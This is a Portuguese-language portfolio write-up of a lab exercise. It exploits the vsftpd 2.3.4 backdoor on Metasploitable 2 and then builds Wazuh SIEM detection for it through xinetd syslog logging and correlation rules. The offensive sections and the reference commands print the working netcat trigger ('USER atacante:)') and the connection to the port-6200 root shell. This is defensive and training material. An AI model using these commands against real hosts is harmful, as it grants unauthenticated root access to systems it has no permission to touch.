# 🛡️ Ataque 3 — Backdoor vsftpd 2.3.4: Invasão e Detecção

### Projeto de portfólio SOC / Blue Team — Pedro Ferraz

**Técnica MITRE ATT&CK:** T1190 — Exploit Public-Facing Application
**Ambiente:** laboratório isolado (Kali atacante · Metasploitable 2 alvo · Wazuh SIEM)
**Objetivo:** explorar um serviço vulnerável real, obter acesso root, descobrir por que o ataque é invisível aos logs, e construir a detecção no SIEM.

---

## 0. O contexto: um lab mais realista

Para este cenário, adicionei ao laboratório o **Metasploitable 2** — uma máquina propositalmente vulnerável, usada como alvo de treino. Isso exigiu rearquitetar a rede:

- **Rede de ataque (isolada, 192.168.100.0/24):** Kali, Ubuntu-Lab e Metasploitable. Sem acesso à internet.
- **Rede de gerência (com NAT):** usada só pelo Wazuh, para baixar atualizações.
- **O Wazuh ficou com duas "pernas"** (uma em cada rede): recebe logs pela rede isolada e baixa updates pela gerência.

> Princípio de segurança aplicado: uma máquina vulnerável NUNCA toca a internet. Segregação de rede é defesa básica.
> 

### Monitoramento sem agente

O Metasploitable é de 2012 — o agente moderno do Wazuh não instala nele. Solução: **monitoramento sem agente via syslog.** O Metasploitable envia seus logs pela rede (UDP/514) e o Wazuh os recebe.

- No Wazuh (`ossec.conf`): bloco `<remote>` escutando syslog na porta 514, aceitando só o IP do Metasploitable.
- No Metasploitable (`/etc/syslog.conf`): linha `.* @<IP-do-Wazuh>` para enviar tudo.

> Skill de SOC: nem toda máquina aceita agente (firewalls, switches, sistemas legados). Coletar log sem agente é essencial no mundo real.
> 

---

## 1. O que é este ataque

O Metasploitable roda **vsftpd 2.3.4** na porta 21 — uma versão que foi **adulterada por um atacante em 2011**, com um **backdoor** embutido no código. Quando alguém tenta logar com um usuário terminado em `:)` (uma carinha), o backdoor abre um shell de **root** na porta **6200**, sem pedir senha.

<img width="843" height="510" alt="Captura de tela 2026-10-23 205702" src="https://github.com/user-attachments/assets/8c37a40b-07e3-41a4-8d10-06eb7b45ba11" />

---

## 2. A exploração (lado ofensivo)

**Passo 1 — Acionar o backdoor.** Conexão crua ao FTP:

```
nc 192.168.100.50 21
USER atacante:)
PASS qualquercoisa
```

O `:)` no usuário é o gatilho. A senha não é verificada.

**Passo 2 — Conectar no shell de root.** Em outro terminal:

```
nc 192.168.100.50 6200
id      → uid=0(root) gid=0(root)
whoami  → root
```

Acesso root obtido, sem força bruta, sem senha.

<img width="823" height="606" alt="Captura de tela 2026-10-23 210853" src="https://github.com/user-attachments/assets/fe7caf0d-45c3-4fd9-8158-5f897a1b1d5d" />

---

## 3. O problema: o ataque é invisível

Após a invasão, fui verificar o que o SIEM capturou. Resultado: **nada.** O backdoor passou despercebido.

Por quê:

- O backdoor abre um shell **direto**, pulando toda a autenticação normal — então não gera "login", "senha" nem "falha" em nenhum log.
- A porta 6200 abre silenciosamente; nenhum serviço anuncia isso.
- O FTP (vsftpd), por padrão neste sistema, vem com logging desligado.

> Lição central: os ataques mais perigosos muitas vezes NÃO deixam rastro nos logs padrão. O analista maduro detecta pelo COMPORTAMENTO, não pelo que o sistema loga.
> 

---

## 4. Dando visibilidade ao SIEM

Descobri que o FTP é iniciado pelo **xinetd** (um "super-servidor" que inicia serviços sob demanda), não por um serviço próprio. A configuração fica em `/etc/xinetd.d/vsftpd`.

Ativei o log do xinetd para registrar cada conexão FTP via syslog:

```
log_type        = SYSLOG daemon info
log_on_success  = HOST PID USERID DURATION
log_on_failure  = HOST USERID
```

Após reiniciar o xinetd, cada conexão ao FTP passou a gerar uma linha de log — que viaja via syslog até o Wazuh:

```
xinetd[6071]: START: ftp
xinetd[6071]: EXIT: ftp duration=10(sec)
```

<img width="1565" height="586" alt="Captura de tela 2026-10-23 214633" src="https://github.com/user-attachments/assets/561c5d5b-a90c-425e-8381-877e9bd0a316" />

---

## 5. A regra de detecção (lado defensivo)

Escrevi duas regras. Detalhe técnico importante: o Wazuh não tinha decoder para extrair campos dessa linha, então ancorei a regra pelo **`program_name`** (que a fase de pre-decoding sempre identifica) — uma técnica robusta para logs de serviços sem decoder dedicado.

**Regra base** — detecta uma conexão FTP:

```xml
<rule id="100020" level="6">
  <program_name>xinetd</program_name>
  <match>START: ftp</match>
  <description>Conexao FTP detectada no Metasploitable (servico legado/vulneravel)</description>
  <group>ftp,recon,</group>
</rule>
```

**Regra de correlação** — detecta o padrão de ataque:

```xml
<rule id="100021" level="11" frequency="4" timeframe="60">
  <if_matched_sid>100020</if_matched_sid>
  <description>Multiplas conexoes FTP ao Metasploitable - possivel ataque ao vsftpd (backdoor 2.3.4)</description>
  <group>ftp,attack,</group>
</rule>
```

Os três pilares da detecção: **4 conexões** (limiar) / **em 60s** (janela) / agrupadas pelo serviço. Nível 11 = alta severidade.

Testada com `wazuh-logtest` antes de aplicar.

<img width="1016" height="449" alt="Captura de tela 2026-10-23 215431" src="https://github.com/user-attachments/assets/09f4a382-3c2c-4de3-8311-18aa5f7cfa91" />

---

## 6. O resultado — ciclo completo

Disparei várias conexões FTP seguidas (reacionando o backdoor). O Wazuh detectou:

- Vários eventos **100020** (nível 6) — cada conexão
- O alerta **100021** (nível 11) — "possível ataque ao vsftpd (backdoor 2.3.4)"

<img width="1628" height="871" alt="Captura de tela 2026-10-23 215742" src="https://github.com/user-attachments/assets/7dc3d837-9d04-4707-809b-a8065806583d" />

A invasão, antes invisível, agora é detectada e alertada no SIEM.

---

## 7. Conceitos demonstrados

- Segregação de rede: rede de ataque isolada + rede de gerência
- Monitoramento sem agente (agentless) via syslog
- Exploração de serviço vulnerável por versão (vsftpd 2.3.4 backdoor)
- Conceito de backdoor e acesso não autenticado
- Detecção por comportamento quando o ataque não gera log de autenticação
- Instrumentação de log em serviço legado (xinetd)
- Regra Wazuh ancorada por `program_name` (quando não há decoder)
- Correlação de eventos (limiar + janela)
- MITRE ATT&CK: T1190 — Exploit Public-Facing Application

---

## Comandos de referência

```
# Reconhecimento (Kali)
nmap -sV -p 21 192.168.100.50

# Exploração (Kali)
nc 192.168.100.50 21      # USER atacante:)  / PASS qualquercoisa
nc 192.168.100.50 6200    # shell de root

# Gerar rajada de conexões (Kali)
for i in 1 2 3 4 5; do echo "USER atacante:)" | nc -w 1 192.168.100.50 21; done

# Testar regra (Wazuh)
sudo /var/ossec/bin/wazuh-logtest

# Aplicar (Wazuh)
sudo systemctl restart wazuh-manager
```

*Projeto realizado em laboratório isolado e controlado, exclusivamente para estudo de detecção e defesa.*
